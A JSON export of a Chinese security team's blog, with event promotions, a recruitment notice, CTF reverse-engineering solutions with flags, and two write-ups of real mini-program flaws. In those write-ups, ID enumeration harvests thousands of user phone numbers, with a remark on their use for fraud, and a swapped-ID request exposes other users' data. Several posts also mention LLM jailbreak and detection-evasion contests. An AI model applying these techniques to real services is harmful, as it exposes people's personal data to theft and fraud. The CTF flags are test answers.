{"meta":{"title":"SecureNexusLab","subtitle":"","description":"专注于网络安全与知识分享","author":"SecureNexusLab","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-07-14T14:00:11.827Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"我们团队致力于全方位的安全研究，希望可以给大家带来一些收获。一群：343380539二群：602348001"},{"title":"所有标签","date":"2025-07-14T14:00:11.851Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"SecureNexusLab团队","date":"2025-07-16T04:50:42.418Z","updated":"2025-07-16T04:50:42.418Z","comments":true,"path":"contributors/index.html","permalink":"http://example.com/contributors/index.html","excerpt":"2023：edusrc 总提交漏洞数量： 97 | 江西财经大学、同济大学、辽宁交通学院等漏洞报送证书 | cnvd漏洞若干 | 漏洞盒子公益src月榜前15 | 百度src月榜23 | 在腾讯src、新氧src等企业安全应急响应中心提交过漏洞，目前主要精力在挖掘企业src | datacon 漏洞挖掘赛道第四名 | 多个物联网固件0day漏洞 2024: Datacon2024 软件供应链安全赛道冠军 DataCon2024 AI安全赛道季军 DataCon2024 漏洞分析赛道亚军 ByteAI 优胜队伍 系统0day安全-IOT设备漏洞挖掘系列课程 2025 移动公司渗透测试 高危漏洞18个，低中危漏洞80+ cnvd20+ 3 cve 360众测 HACK@Data 硬件安全竞赛 冠军(@HASS Lab) 季军(@SecureNexusLab) 联合腾讯举办 —— 腾讯AIGC识别对抗挑战赛 联合 朱雀 &amp; 悟空安全 举办 —— 大模型引擎计划全球实训营","text":"2023：edusrc 总提交漏洞数量： 97 | 江西财经大学、同济大学、辽宁交通学院等漏洞报送证书 | cnvd漏洞若干 | 漏洞盒子公益src月榜前15 | 百度src月榜23 | 在腾讯src、新氧src等企业安全应急响应中心提交过漏洞，目前主要精力在挖掘企业src | datacon 漏洞挖掘赛道第四名 | 多个物联网固件0day漏洞 2024: Datacon2024 软件供应链安全赛道冠军 DataCon2024 AI安全赛道季军 DataCon2024 漏洞分析赛道亚军 ByteAI 优胜队伍 系统0day安全-IOT设备漏洞挖掘系列课程 2025 移动公司渗透测试 高危漏洞18个，低中危漏洞80+ cnvd20+ 3 cve 360众测 HACK@Data 硬件安全竞赛 冠军(@HASS Lab) 季军(@SecureNexusLab) 联合腾讯举办 —— 腾讯AIGC识别对抗挑战赛 联合 朱雀 &amp; 悟空安全 举办 —— 大模型引擎计划全球实训营","author":"SecureNexusLab"},{"title":"所有分类","date":"2025-07-14T14:00:11.828Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"独角鲸 & 朱雀 & 悟空安全：连接未来，启程AI之旅，大模型引擎计划全球实训营正式启动！","slug":"LLM-engine-plan","date":"2025-07-15T16:00:00.000Z","updated":"2025-07-16T04:50:36.219Z","comments":true,"path":"2025/07/16/LLM-engine-plan/","permalink":"http://example.com/2025/07/16/LLM-engine-plan/","excerpt":"","text":"在人工智能技术飞速发展的今天，大模型已成为推动行业变革的核心力量。为助力全球青年AI学习者探索前沿技术、实现职业飞跃，独角鲸联合腾讯朱雀实验室、腾讯悟空安全团队，以及多所顶尖高校与科研机构，正式推出暑期全球大模型实训营！这是一场为期四周的线上学习盛宴，旨在为每一位AI爱好者提供零门槛、高价值的成长机会。 TOP 01项目亮点：自由参与，全程赋能 轻松参与，快速进阶，不设门槛，全程线上 面向全球青年AI学习者。 不限专业背景，零基础可报名。 全免费参加，灵活模式自由选择。 聚焦LLM实战与科研训练，打造学术+产业协同路径 TOP 02 项目简介：顶尖资源，全程护航 独角鲸是SecureNexusLab团队中负责LLM生态的小组，本次实训营由独角鲸在 AIGC对抗识别挑战赛基础上，联合腾讯朱雀实验室、腾讯悟空安全团队、北京大学、中科院软件所、西安电子科技大学、同济大学等重点高校与科研机构共同发起，聚焦大模型前沿课题，打造学术+产业融合的全链路成长路径。参与者将有机会通过本项目直接获得领域前沿导师的长期指导。 我们汇聚来自企业、学术、开源社区的多方资源，助你在短时间内获得实战技能，实现从学习到实习再到科研与就业的飞跃。 TOP 03 流程安排 TOP 04 你将获得 1、直接产业实际的LLM项目经验 2、独角鲸&amp;腾讯·朱雀的联合认证证书+竞赛奖金 3、优秀学员直通腾讯实习通道，部分可转正 4、项目经验+简历优化+技术指导 5、加入全球AI开发者社群，拓展多学科人脉 6、优秀的创新课题，支撑论文发表&#x2F;科研推荐 TOP 05 双赛道主题 赛道一:大模型安全与工具研究|Research Track:LLM Safety &amp;Tooling 聚焦AI基础设施、Prompt安全性分析、AI赋能漏洞挖掘等议题(1-3人组队) 开源AI框架与组件的CVE漏洞和常见风险的自动化扫描 Prompt 注入与Jailbreak等风险的攻击与防御 AI在自动化代码漏洞审计与渗透测试场景的应用 赛道二:大模型创新应用创新|Application Track:Applied LLM Use Cases 强调跨学科创意、实际应用场景、原型开发与用户体验(1-3人组队) LLM in 教育&#x2F;医疗&#x2F;金融应用设计 多模态智能助手开发，构建人性化跨模态助手工具 MCP 平台下的人机协作实践，开发具备实用性的AI协作应用场景 说明 :应用赛道选题自由，可自行拟定、鼓励跨学科组队；你不一定是程序员，只要你有点子、有热情即可参与组队! 全球 AI 青年别等了！7 月 21 日 - 8 月 15 日，这是你离 AI 前沿最近的一次不管是想进大厂、发论文、搞科研，还是单纯想解锁大模型技能，实训营都能给你 “跳板”！抓住暑期弯道超车机会，让你的 AI 简历直接 “开挂”！ 报名方式 关注公众号 发送： 大模型引擎训练营 即可获取报名链接！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"中科院软件所｜凌祥课题组招生","slug":"iscas","date":"2025-06-11T16:00:00.000Z","updated":"2025-07-15T14:08:45.367Z","comments":true,"path":"2025/06/12/iscas/","permalink":"http://example.com/2025/06/12/iscas/","excerpt":"","text":"发布时间: 一、导师介绍凌祥，副研究员，硕士生导师，中国科学院软件研究所优秀青年科技人才，主要研究方向为智能软硬件安全，致力于解决智能软硬件及其供应链中存在的安全问题； 主持国家自然科学基金、重点研发计划课题等多项重点项目，在IEEE S&amp;P、USENIX Security、ICSE、TIFS等权威期刊会议发表论文30余篇； 任Cybersecurity、信息安全学报、网络空间安全科学学报青年编委，EASE2025程序委员会委员，开放原子基金会开源漏洞共享平台工作组组长，曾获ACM SIGSOFT杰出论文奖、Cybersecurity优秀审稿人等荣誉； 长期指导学生参与智能软硬件安全相关竞赛，获得2025年HACK@DATE国际硬件安全竞赛冠军和多次DataCon大数据安全分析竞赛冠军(2020年、2021年、2022年、2024年)。 更多信息请参考官方主页(https://people.ucas.edu.cn/~lingxiang)及个人主页(https://ryderling.github.io/)。 二、招生方向课题组的主要方向是智能软硬件安全，包括但不限于： 智能软件安全 ，主要包括大模型等智能技术驱动的软件安全研究，例如面向Linux内核、编译器、AI框架等基础软件的静态代码分析或者模糊测试、软件供应链“投毒”检测，以及智能软件本身的安全问题研究，例如大模型投毒、越狱攻击等； 智能硬件安全 ，主要关注RISC-V处理器安全研究，例如面向“香山”开源处理器的漏洞挖掘与智能修复； 复杂智能系统安全 ，主要关注当前包含大模型、软件、硬件等在内的复杂智能系统的安全威胁与防御技术研究，例如，面向具身智能的安全威胁检测与防御方法。 推免学生 ：参加中国科学院软件研究所“软件与网络”夏令营（一般5月份报名，7月下旬举办并进行面试，具体关注所官网）；9月份正式参加中国科学院软件研究所推免考核。 2025年软件所夏令营：http://www.iscas.ac.cn/yjsjy2016/zsxx2016/202505/t20250530_7794448.html 统招学生 ：按照国家&#x2F;研究所相关考研规定。 实习学生 ：也可提供中长期实习岗位，表现优异者有机会获得推免&#x2F;统招复试的双选优先资格。 三、招生要求及联系方式课题组对学生生源学校没有限制，非常欢迎基本能力足够优秀的学生联系，满足以下条件的加分（非必须）： ✅ 自驱力强 ✅ 对软件安全有兴趣 ✅ 对硬件安全有兴趣 ✅ 有一定的Coding能力 ✅ 对科研有兴趣 感兴趣的同学以“保研&#x2F;考研&#x2F;实习学生自荐”为邮件联系： lingxiang@iscas.ac.cn，并附上个人简历、成绩单、获奖材料、开源项目链接等材料（非必须）。 四、研究所&#x2F;学校介绍中国科学院软件研究所，位于北京市海淀区中关村南四街4号，是一所致力于计算机科学理论和软件高新技术的研究与发展的综合性研究所，集中了一批学术造诣深厚、享誉国内外的科学家，拥有一支高素质、高水平的青年科技人才队伍，包括中国科学院院士4人，对我国计算机科学与软件事业的发展做出了大量基础性、战略性和前瞻性的贡献，以第一完成人获得国家、省部级以上科学技术奖46项。课题组所招收学生的学位均由中国科学院大学颁发，中国科学院软件研究所是研究生培养单位，招生专业主要包括在计算机科学与技术(A+)、软件工程(A-)和网络空间安全、电子信息等。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"记一次容易被忽视的功能点造成的大量信息泄露","slug":"information-leak-by-click-record","date":"2025-06-07T16:00:00.000Z","updated":"2025-07-15T14:25:26.766Z","comments":true,"path":"2025/06/08/information-leak-by-click-record/","permalink":"http://example.com/2025/06/08/information-leak-by-click-record/","excerpt":"","text":"总体情况 某拼团小程序存在系统信息泄露漏洞 以下为漏洞详情 01 02 点击拼团详情，抓包 数据包： 1GET /zinfo/tail?initiateId=4&amp;target=2 HTTP/1.1Host: xxxxxAccept: application/json, text/plain, */*Xweb_xhr: 1Authorization: NTc3ODU0MzRFODVGNDRENkY0NzE0MDMwREU1NTc3NERDMkYzNUU0NDNCN0E1NDRENDQ3NzZBQjgxMTA4OUEyNA==User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c33)XWEB/13487Content-Type: application/x-www-form-urlencodedSec-Fetch-Site: cross-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://servicewechat.com/wx90229e983b201cf1/109/page-frame.htmlAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Priority: u=1, iConnection: keep-alive 从手机号尾数可得泄露号码为第一个拼团用户号码 03 进行initiateId遍历可获得大量拼团用户手机号码 9938个电话号码 由于用户均为参加拼团用户，且为未拼团成功的用户可利用这一点进行定点诈骗等添加个人信息微信。 最后，欢迎来自不同背景的师傅加入我们，一起打造一个活跃的交流社群，在SNL社群没有背景、能力的差异，我们欢迎大家一起学习进步。 我们是一支多元化的安全技术团队，成员活跃在渗透测试、漏洞挖掘、逆向工程等多个安全领域。日常社群氛围充满技术热情：大家会一起分析最新漏洞案例，组织内部渗透测试实战，协作开发安全研究项目。 团队定期开展技术分享会，从Web安全到二进制漏洞，从CTF解题技巧到企业级安全防护，各种技术话题都能在这里碰撞出火花。如果你也热衷于安全技术的实践与交流，欢迎加入我们一起成长！ SecNL团队常态化招新提示","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"IntAX"},{"title":"完赛！AIGC 识别对抗挑战赛圆满落幕","slug":"AIGC-Chellenge-end","date":"2025-05-12T16:00:00.000Z","updated":"2025-07-16T02:15:23.918Z","comments":true,"path":"2025/05/13/AIGC-Chellenge-end/","permalink":"http://example.com/2025/05/13/AIGC-Chellenge-end/","excerpt":"","text":"发布时间: 近日，由腾讯朱雀实验室与 SecureNexusLab 联合主办的2025 AIGC识别对抗挑战赛圆满落幕！ 赛事概览 2025 AIGC识别对抗挑战赛由腾讯朱雀实验室与 SecureNexusLab联合主办，北京大学信息工程学院、北京大学未来网络国家重大科技基础设施实验室以及米斯特安全团队共同协办。 ![640.jpg](&#x2F;images&#x2F;完赛！AIGC 识别对抗挑战赛圆满落幕！&#x2F;1752587226126.jpg) 本次大赛设置 AIGC 论文检测绕过与 AIGC 人像检测绕过两大赛道，鼓励参赛者运用提示词工程等技术手段挑战朱雀 AI检测系统的能力边界。在对抗中激发灵感，在攻防中精进技能——这不仅是一次技术的深度切磋，更是一次 AI 安全实战的高水平交流。 全程筑造 从筹备之初，社群便承担起赛事制定全流程的重任。在竞赛项目设置上，我们深入调研，结合当下热点与参赛人群特点，设计出既具挑战性又富趣味性的比赛内容。 同时，为确保比赛公平公正，我们精心制定了细致且明确的多维评分标准与权重，力求对每一位参赛者的努力给予最客观的评价。 ![image.png](&#x2F;images&#x2F;完赛！AIGC 识别对抗挑战赛圆满落幕！&#x2F;1752587226311.png) 网站搭建与安全维护同样是我们工作的重点。为给大家提供便捷流畅的参赛体验，技术团队日夜奋战，搭建起功能完备的赛事官网。 ![image.png](&#x2F;images&#x2F;完赛！AIGC 识别对抗挑战赛圆满落幕！&#x2F;1752587226374.png) 从赛事信息发布、报名系统，到成绩查询板块，每一个细节都经过反复打磨。同时，部署了严密的安全防护体系，全力保障网站安全稳定运行，守护每一位参赛者的数据安全。 匠心定制 在奖品定制方面，社群同样用心满满。我们充分考虑赛事特点与参赛者需求，定制了一系列极具纪念意义与实用价值的奖品。这些奖品不仅是对参赛者努力的认可，更是这场精彩赛事的独特见证。 ![](&#x2F;images&#x2F;完赛！AIGC 识别对抗挑战赛圆满落幕！&#x2F;1752587226505.jpg)![](&#x2F;images&#x2F;完赛！AIGC识别对抗挑战赛圆满落幕！&#x2F;1752587227138.jpg) ![](&#x2F;images&#x2F;完赛！AIGC 识别对抗挑战赛圆满落幕！&#x2F;1752587227208.jpg) 携手同行 如今，竞赛虽已结束，但我们的征程还在继续。未来，社群将继续携手腾讯朱雀及更多合作伙伴，举办更多精彩赛事，为大家提供更多展示才华、交流学习的平台。感谢每一位参赛者的热情参与，也感谢所有工作人员的辛勤付出，让我们共同期待下一次相聚！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"AIGC 识别对抗挑战赛报名火热进行中！！","slug":"AIGC-CHallenge-2025","date":"2025-04-22T16:00:00.000Z","updated":"2025-07-15T14:15:25.505Z","comments":true,"path":"2025/04/23/AIGC-CHallenge-2025/","permalink":"http://example.com/2025/04/23/AIGC-CHallenge-2025/","excerpt":"","text":"Q1 AIGC 识别对抗挑战赛 2025 AIGC识别对抗挑战赛由腾讯朱雀实验室与 SecureNexusLab联合主办，北京大学信息工程学院、北京大学未来网络国家重大科技基础设施实验室以及米斯特安全团队共同协办。赛事现已开启报名，无论您是安全研究员、技术专家，还是对人工智能充满热情的探索者，都欢迎加入我们，共同拓展人工智能安全技术的边界！ ![图片](&#x2F;images&#x2F;AIGC 识别对抗挑战赛报名火热进行中！！&#x2F;1752587222120.jpg) 本次大赛设置 AIGC 论文检测绕过与 AIGC 人像检测绕过两大赛道，鼓励参赛者运用提示词工程等技术手段挑战朱雀 AI检测系统的能力边界。在对抗中激发灵感，在攻防中精进技能——这不仅是一次技术的深度切磋，更是一次 AI 安全实战的高水平交流。 优秀参赛者将获得腾讯实习与社招的优先面试机会，以及腾讯颁发的专业能力认证！ Q2 大赛主题方向 一、AIGC论文检测绕过赛道：参赛者需要针对学术论文场景，通过提示词工程技术生成能够绕过朱雀大模型检测系统的文本样本。 二、AIGC人像检测绕过赛道：参赛者需要针对人像照片场景，通过提示词工程技术生成能够绕过朱雀大模型检测系统的图像样本。 Q3 报名时间与报名规则 参赛选手 本次竞赛不设门槛，不限年龄和身份，欢迎相关领域的技术人才共同参与。 报名规则 扫描下方二维码进行报名或进入官网（https://tencent.zhuqueai.top/）报名，每个队伍最少一个人，最多三个人。参赛者需要于4月25日晚17点40点前完成报名 ![图片](&#x2F;images&#x2F;AIGC 识别对抗挑战赛报名火热进行中！！&#x2F;1752587222573.jpg) 报名成功后将在一至两个工作日内收到确认邮件和比赛手册。 Q4 参赛流程 报名阶段： 即日起至2025年4月25日晚20点，参赛者可以通过官网或上述二维码提交报名信息。报名成功后，将于1-2个工作日内收到确认邮件、参赛指南和官方 QQ 群。 竞赛阶段： 2025年4月26日 — 2025年4月28日，参赛选手每日提交相关文件。经后台评估后官网每日公布排名前20的选手。 WritUp提交阶段： 2025年4月29日17:00点前，比赛结束后选手需在截止时间前提交 WriteUp 文件。 公布阶段： 2025年4月30日公布最终排名。 立即报名，加入我们，挑战AI生成检测极限！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"记一次小程序的越权攻击","slug":"small-program-attack","date":"2025-04-21T16:00:00.000Z","updated":"2025-07-15T14:28:18.361Z","comments":true,"path":"2025/04/22/small-program-attack/","permalink":"http://example.com/2025/04/22/small-program-attack/","excerpt":"","text":"发布时间: 总体情况 某小程序存在一越权漏洞 以下为系统手工验证 来到小程序注册好然后点击个人中心，然后抓包然后抓到数据包： 发现被加密了，然后我们逆向破解得到key 然后解密： 发现存在自己的ID1012504101466这里记录一下，然后替换成1012504101469然后发包 然后我们解密返回包： 发现获取到了别人的信息，然后这个包含了一个bizcardId这个是企业的id然后我们记录一下：BIZCARDID25*****64 然后我们点击企业管理然后抓包 然后我们解密一下返回包 发现存在自己的敏感信息然后我们解密请求包 然后替换成为我们记录的ID BIZCARDID25*****64发包 然后我们解密数据包发现返回了别人的敏感信息 成功实现越权 1012504101******18466 自己的UID 1012504101******18469 受害者的UID 我们可以发现只有1012504101和中间的184相同只有七位数是不同的所以这是一个可遍历的ID","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"PolarCTF[RE][easy]全解(上)","slug":"PolarCTF[RE][easy]全解(上)","date":"2025-03-02T16:00:00.000Z","updated":"2025-07-16T02:07:16.381Z","comments":true,"path":"2025/03/03/PolarCTF[RE][easy]全解(上)/","permalink":"http://example.com/2025/03/03/PolarCTF[RE][easy]%E5%85%A8%E8%A7%A3(%E4%B8%8A)/","excerpt":"","text":"引言 本次分享PolarCTF靶场中所有[easy]re题目的WP。 由于文章篇幅较长（一共有22道题目），分为两期发表,本期先分享上半部分内容，适合刚接触逆向的朋友。如果你也对逆向感兴趣，或者正在准备CTF比赛，希望这些内容能给大家一些帮助。 PolarCTF[ezpack] 发现是Aspack壳，用工具脱壳： 32位：用IDA打开。直接shift+f12发现关键字符“Enter password:” 直接跟进函数看看： 关键函数：sub_401738。继续跟进去看看： 大概逻辑就是：input逐个和0xC进行异或，然后和Str2进行比较 所以input = Str2 ^ 0xC 查看一下Str2 = &gt;4i44oo4?i=n&gt;:m;8m4=oo4i;&gt;?4&gt;h9m`` 编写解密脚本： 12345678910#include &lt;stdio.h&gt;int main()&#123; char str[] = &quot;&gt;4i44oo4?i=n&gt;:m;8m4=oo4i;&gt;?4&gt;h9m&quot;; for(int i = 0; i &lt; 32; i++) &#123; str[i] ^= 0xC; &#125; printf(&quot;%s&quot;, str); return 0;&#125;// 28e88cc83e1b26a74a81cc8e72382d5a PolarCTF[L00k_at_h3r3] 查壳发现是NsPack，用工具脱壳： 32位，用IDA打开。直接搜索函数，找到main函数： 很长，但实际上很简单，步骤大概是： 和几个数组逐个进行比较，且异或不同的数 例如第一个for循环，input[i]和 aNqt[i] ^ 0xBu的结果进行比较 第二个for循环，input[i+len(aNqt)]和 aKixs[i] ^ 0xCu的结果进行比较 … aNqt &#x3D; nqT aKixs &#x3D; kixS aKa9jr &#x3D; ka9jR aHCq &#x3D; h|&gt;cQ aG &#x3D; g&lt;}&lt; 编写解密脚本： 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt; int main()&#123; char str1[] = &quot;nqT&quot;; char str2[] = &quot;kixS&quot;; char str3[] = &quot;ka9jR&quot;; char str4[] = &quot;h|&gt;cQ&quot;; char str5[] = &quot;g&lt;&#125;&lt;&quot;; for(int i = 0; i &lt; sizeof(str1)-1; i++) &#123; str1[i] ^= 0xBu; &#125; printf(&quot;%s&quot;, str1); for(int i = 0; i &lt; sizeof(str2) - 1; i++)&#123; str2[i] ^= 0xCu; &#125; printf(&quot;%s&quot;, str2); for(int i = 0; i &lt; sizeof(str3) - 1; i++) &#123; str3[i] ^= 0xDu; &#125; printf(&quot;%s&quot;, str3); for (int i = 0; i &lt; sizeof(str4) - 1; i++)&#123; str4[i] ^= 0xEu; &#125; printf(&quot;%s&quot;, str4); for(int i = 0; i &lt; sizeof(str5) - 1; i++)&#123; str5[i] ^= 0xFu; &#125; printf(&quot;%s&quot;, str5); return 0; &#125;//ez_get_fl4g_fr0m_h3r3// 需要md5 32位小写加密后再提交 PolarCTF[shell] 查壳发现是upx 工具脱壳：upx -d [FilePath] 32位，IDA打开，shitf+F12发现关键字符串。跟进去看看 F5反编译直接看到！ PolarCTF[PE结构] 不是PE文件？根据题目，大概可以猜到，是想让我们修复PE结构。winhex打开看看 上来就发现不是MZ！notepad++修改一下（别问为什么不是winhex，notepad用起来顺手一点QAQ） 再打开，发现OK了。 直接运行试试： PolarCTF[拼接] 32位，直接用IDA打开，发现脸上就是main函数，手直接就挪F5上了啊！ 嗯······这拼接在，嗯。哈哈。 ‍ PolarCTF[加加减减] 32位，IDA打开。main函数又在脸上，直接F5： 看眼逻辑：input每位都--，然后与str2进行比较。 所以str2每位都++，就是flag 12345678910int main() &#123; char str2[] = &quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;; for (int i = 0; i &lt; strlen(str2); i++) &#123; str2[i]++; &#125; printf(&quot;%s&quot;, str2); return 0;&#125; PolarCTF[HowTo\\_LogIn] upx壳，工具脱掉： 32位，因为是注册机，所以先运行看看： OK，上IDA，搜索字符串看看： 跟进去发现关键： pawd会被打印，所以可以x64嗯调到打印的地方？ 哦不行，试了一下发现，只会打印输入的东西，还是得自己对照QAQ 复制下来试试： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char v11[20]; v11[0] = &#x27;C&#x27;; v11[1] = &#x27;Z&#x27;; v11[2] = &#x27;9&#x27;; v11[3] = &#x27;d&#x27;; v11[4] = &#x27;m&#x27;; v11[5] = &#x27;q&#x27;; v11[6] = &#x27;4&#x27;; v11[7] = &#x27;c&#x27;; v11[8] = &#x27;8&#x27;; v11[9] = &#x27;g&#x27;; v11[10] = &#x27;9&#x27;; v11[11] = &#x27;G&#x27;; v11[12] = &#x27;7&#x27;; v11[13] = &#x27;b&#x27;; v11[14] = &#x27;A&#x27;; v11[15] = &#x27;X&#x27;; v11[16] = &#x27;\\0&#x27;; if (strlen(v11) == 0x10) &#123; printf(&quot;%s&quot;, v11); &#125; return 0;&#125; 运行检验一下： 哦对，邮箱要有@，且@后面有字符，有.，且.后面要有字符。反正写规范一点，直接123会被拦截 tip：最终密码要进行32位md5加密哦 flag{c3ec13a01b07ad218dbd5f4bbab592b9} PolarCTF[box] 64位ELF。进kali看看： 程序入口是key2。IDA，启动！ 跟进去发现，key2=str1，str1 &#x3D; that_ok &#x3D; key2 接着找谁调用了key2()，找到main函数 直接复制下来，运行一下发现：key1 = 11694441，key3 = NNSXS=== 拼起来：flag&#123;11694441that_okNNSXS===&#125; 啊？不对。 草，key3需要base32解密，结果为：key 所以：flag&#123;11694441that_okkey&#125;，再进行md5，32位小写加密即可 ‍ PolarCTF[crc] 64位ELF，进kali看看：发现没有任何输出，直接等你输入。 好吧，那IDA启动！ 简单分析一下strmncpy函数： 简单分析一下magic函数： 查找发现，python的binascii库和zlib库有crc32 因为flag的前4位包是flag，所以可以试试：flag加密后是否和0xd1f4eb9a相等，看看python库里的crc32的实现是否和这题的实现一致。 OK！可以开始爆破了 12345678910111213141516171819202122232425262728293031323334353637import binasciidef find_matches(): # Single-character checks for i in range(128): s = chr(i) crc = binascii.crc32(s.encode()) if crc == 0x15d54739: print(f&quot;str2 = &#123;s&#125;&quot;) if crc == 0xfcb6e20c: print(f&quot;str6 = &#123;s&#125;&quot;) # Two-character checks for i in range(128): for j in range(128): s = chr(i) + chr(j) crc = binascii.crc32(s.encode()) if crc == 0x3fcbd242: print(f&quot;str4 = &#123;s&#125;&quot;) # Four-character checks for i in range(128): for j in range(128): for k in range(128): for l in range(128): s = chr(i) + chr(j) + chr(k) + chr(l) crc = binascii.crc32(s.encode()) if crc == 0xd1f4eb9a: print(f&quot;str1 = &#123;s&#125;&quot;) if crc == 0x540bbb08: print(f&quot;str3 = &#123;s&#125;&quot;) if crc == 0x2479c623: print(f&quot;str5 = &#123;s&#125;&quot;) print(&quot;end&quot;)find_matches() 拼起来：flag{ezrebyzhsh} ‍ PolarCTF[EasyCPP2] 64位ELF。直接运行发现：没有任何输出，直接等你输入。 IDA启动： 看了眼flag = qisngksofhuivvmg 再看眼encode()：+=3再^6=1u 所以对flag = qisngksofhuivvmg进行encode()就是我们的input 123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char flag[] = &quot;qisngksofhuivvmg&quot;; for (int i = 0; i &lt;= 15; i++) &#123; flag[i] += 3; flag[i] ^= 0x1u; &#125; printf(&quot;%s&quot;, flag); return 0;&#125; PolarCTF[一个flag劈三瓣儿] 64位ELF，直接运行：flag{HaiZI233N145wuD!le112@666} 啊？真这么简单wow","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}],"author":"白玉京"},{"title":"听说看过的25年都赚了一个小目标哦！","slug":"SNL-2025","date":"2025-01-27T16:00:00.000Z","updated":"2025-07-15T14:37:58.088Z","comments":true,"path":"2025/01/28/SNL-2025/","permalink":"http://example.com/2025/01/28/SNL-2025/","excerpt":"","text":"年终总结SecureNexusLab在这一年中，经过众多师傅们的努力，逐渐在完善团队的各项机制，虽然还没有那么健全，还需完善，但是每一份成果的诞生，都代表着团队中每一名成员所贡献的一份力量，让我们来看看这一年我们的成就吧！ 团队日常公开分享秉持着开源开放的原则，团队会时常对外进行公开授课分享一些学习经验，以此来激发社会学习氛围，引导团队内部分享精神。 在这一年里，团队一共发布了24个安全技术类型视频，总播放量17.1w+，总关注量近7k。 团队竞赛 ByteAI安全挑战赛第八名 2024年10月，ByteAI赛道聚焦时下火热的AI攻防方向，发起针对大模型的Jailbreak、PromptLeaking攻击，要求选手通过训练攻击样本来突破LLMChatBot的防护。在初赛23天的时间中，来自高校的300多支战队，对赛题定制大模型发起近20多万次攻击，最终团队在本次ByteAI安全挑战赛中，从三百多支战队中，成功的晋级了前十名，最后取得了第八名的成绩。 DataCon2024大数据安全分析竞赛多赛道获奖 DataCon2024大数据安全分析竞赛由清华大学网络科学与网络空间研究院、奇安信集团、蚂蚁集团、广东联通、百度安全、赛尔网络、北京航空航天大学国家卓越工程师学院主办，复旦大学计算机科学技术学院、西安交通大学、腾讯安全应急响应中心、北京蓝莲网安科技有限公司协办，比赛共吸引706支战队、1556人报名参与。最终团队多支队伍分别获得软件供应链安全赛道第一名、漏洞分析赛道第二名、AI安全赛道第十六名 团队开源文档2024在2024年，团队成员通力制作了两份国内少有甚至首发的类目开源文档。 由SecureNexusLab团队编写，旨在帮助师傅们快速了解物联网固件安全，分析掌握物联网设备技能的《物联网设备固件分析指南》。 由SecureNexusLab大语言模型（LLM）团队编写，基于广泛的文献研究、测试平台构建及开源模型测试等一系列工作，系统化地总结了针对 LLM的攻击技术的《大语言模型Prompt攻击手册》。 看雪平台合作课程录制 SHOPPING 